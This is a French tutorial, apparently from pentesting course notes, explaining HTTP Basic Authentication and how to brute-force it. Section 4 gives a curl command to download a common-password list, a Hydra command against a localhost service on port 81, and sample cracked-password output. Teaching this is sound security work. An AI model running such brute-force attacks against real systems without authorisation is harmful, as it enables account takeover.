# Basic HTTP Authentication

***

## <mark style="color:red;">**1. Introduction**</mark>

L'**authentification HTTP basique** (ou Basic Auth) est un mécanisme simple utilisé pour protéger des ressources web. Bien qu'il soit facile à mettre en œuvre, il présente des vulnérabilités de sécurité qui en font une cible fréquente pour les attaques par force brute.

***

## <mark style="color:red;">**2. Fonctionnement de l'authentification HTTP basique**</mark>

Basic Auth repose sur un protocole de **challenge-réponse**. Voici les étapes principales :

1. **Demande initiale**\
   Un utilisateur tente d'accéder à une ressource protégée sur un serveur web.
2. **Réponse du serveur**\
   Le serveur répond avec un **code 401 Unauthorized** et inclut un en-tête `WWW-Authenticate` pour demander les identifiants.
3. **Envoi des identifiants**
   * L'utilisateur fournit un **nom d'utilisateur** et un **mot de passe** dans une fenêtre de connexion.
   * Le navigateur les concatène en une chaîne sous le format `username:password`.
   *   Cette chaîne est ensuite encodée en **Base64** et incluse dans l'en-tête `Authorization` de la requête suivante :

       ```
       Authorization: Basic <credentials_encodés>
       ```
4. **Validation**\
   Le serveur décode la chaîne Base64, compare les identifiants avec sa base de données, et :
   * Accorde l'accès si les identifiants sont corrects.
   * Refuse l'accès en cas d'erreur.

***

## <mark style="color:red;">**3. Exemple pratique**</mark>

**Requête HTTP avec Basic Auth**

Une requête HTTP GET utilisant Basic Auth pourrait ressembler à ceci :

```
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

Dans cet exemple :

* `YWxpY2U6c2VjcmV0MTIz` est la version encodée en Base64 de `alice:secret123`.

***

## <mark style="color:red;">**4. Exploitation de Basic Auth avec Hydra**</mark>

Basic Auth est une cible courante pour les attaques par force brute. **Hydra** est un outil puissant pour réaliser ce type d'attaque.

<mark style="color:green;">**Commandes Hydra**</mark>

1.  **Télécharger une liste de mots de passe**\
    Si vous n'avez pas de liste, vous pouvez en télécharger une comme celle des mots de passe les plus utilisés :

    {% code overflow="wrap" fullWidth="true" %}
    ```bash
    curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
    ```
    {% endcode %}
2.  **Lancer une attaque brute-force avec Hydra** Voici un exemple de commande Hydra pour une cible utilisant Basic Auth :

    {% code overflow="wrap" %}
    ```bash
    hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
    ```
    {% endcode %}

<mark style="color:green;">**Explication de la commande :**</mark>

* `-l basic-auth-user` : Spécifie le nom d'utilisateur à utiliser pour les tentatives de connexion.
* `-P 2023-200_most_used_passwords.txt` : Utilise une liste de mots de passe pour tester chaque mot de passe.
* `127.0.0.1` : L'adresse IP cible (ici, localhost).
* `http-get /` : Indique que l'attaque cible une ressource accessible via une requête HTTP GET au chemin `/`.
* `-s 81` : Spécifie que le service HTTP utilise le port 81 au lieu du port par défaut (80).

<mark style="color:green;">**Analyse des résultats**</mark>

Hydra effectuera des essais systématiques pour chaque mot de passe de la liste et renverra le mot de passe correct une fois trouvé. Voici un exemple de résultat :

```
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: secret2024
```

***
